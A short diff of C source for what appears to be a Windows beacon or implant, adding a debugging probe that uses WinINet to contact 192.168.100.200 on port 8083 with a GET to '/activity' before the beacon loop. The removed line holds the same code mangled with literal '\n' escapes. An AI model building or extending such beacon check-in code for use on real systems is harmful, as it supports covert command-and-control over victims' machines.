@@ -107,7 +107,25 @@ static DWORD WINAPI ObMain(LPVOID unused) {
 		NetworkConfigureHttp(host, S_PORT_HTTP, OB_AGENT);
 	OBTRACE("main: ConfigureHttp done");
 
-	/* preflight wininet probe - locate exactly which call fails */\n	{\n		HINTERNET ho = InternetOpenA("probe", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);\n		{ char tb[160]; sprintf(tb, "preflight: InternetOpenA=0x%p gle=%lu", (void*)ho, (unsigned long)GetLastError()); OBTRACE(tb); }\n		if (ho != NULL) {\n			HINTERNET hi = InternetConnectA(ho, "192.168.100.200", 8083, NULL, NULL, INTERNET_SERVICE_HTTP, 0, 0);\n			{ char tb[160]; sprintf(tb, "preflight: InternetConnectA=0x%p gle=%lu", (void*)hi, (unsigned long)GetLastError()); OBTRACE(tb); }\n			if (hi != NULL) {\n				HINTERNET hrq = HttpOpenRequestA(hi, "GET", "/activity", NULL, NULL, NULL, 0, 0);\n				{ char tb[160]; sprintf(tb, "preflight: HttpOpenRequestA=0x%p gle=%lu", (void*)hrq, (unsigned long)GetLastError()); OBTRACE(tb); }\n				BOOL sent = HttpSendRequestA(hrq, NULL, 0, NULL, 0);\n				{ char tb[160]; sprintf(tb, "preflight: HttpSendRequestA=%d gle=%lu", sent, (unsigned long)GetLastError()); OBTRACE(tb); }\n				InternetCloseHandle(hrq);\n				InternetCloseHandle(hi);\n			}\n			InternetCloseHandle(ho);\n		}\n	STRATEGY strategy = { 0, 0, 0 };
+	/* preflight wininet probe - locate exactly which call fails */
+	{
+		HINTERNET ho = InternetOpenA("probe", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
+		{ char tb[160]; sprintf(tb, "preflight: InternetOpenA=0x%p gle=%lu", (void*)ho, (unsigned long)GetLastError()); OBTRACE(tb); }
+		if (ho != NULL) {
+			HINTERNET hi = InternetConnectA(ho, "192.168.100.200", 8083, NULL, NULL, INTERNET_SERVICE_HTTP, 0, 0);
+			{ char tb[160]; sprintf(tb, "preflight: InternetConnectA=0x%p gle=%lu", (void*)hi, (unsigned long)GetLastError()); OBTRACE(tb); }
+			if (hi != NULL) {
+				HINTERNET hrq = HttpOpenRequestA(hi, "GET", "/activity", NULL, NULL, NULL, 0, 0);
+				{ char tb[160]; sprintf(tb, "preflight: HttpOpenRequestA=0x%p gle=%lu", (void*)hrq, (unsigned long)GetLastError()); OBTRACE(tb); }
+				BOOL sent = HttpSendRequestA(hrq, NULL, 0, NULL, 0);
+				{ char tb[160]; sprintf(tb, "preflight: HttpSendRequestA=%d gle=%lu", sent, (unsigned long)GetLastError()); OBTRACE(tb); }
+				InternetCloseHandle(hrq);
+				InternetCloseHandle(hi);
+			}
+			InternetCloseHandle(ho);
+		}
+	
+STRATEGY strategy = { 0, 0, 0 };
 
 	while (TRUE) {
 		if (BeaconIsExpired())
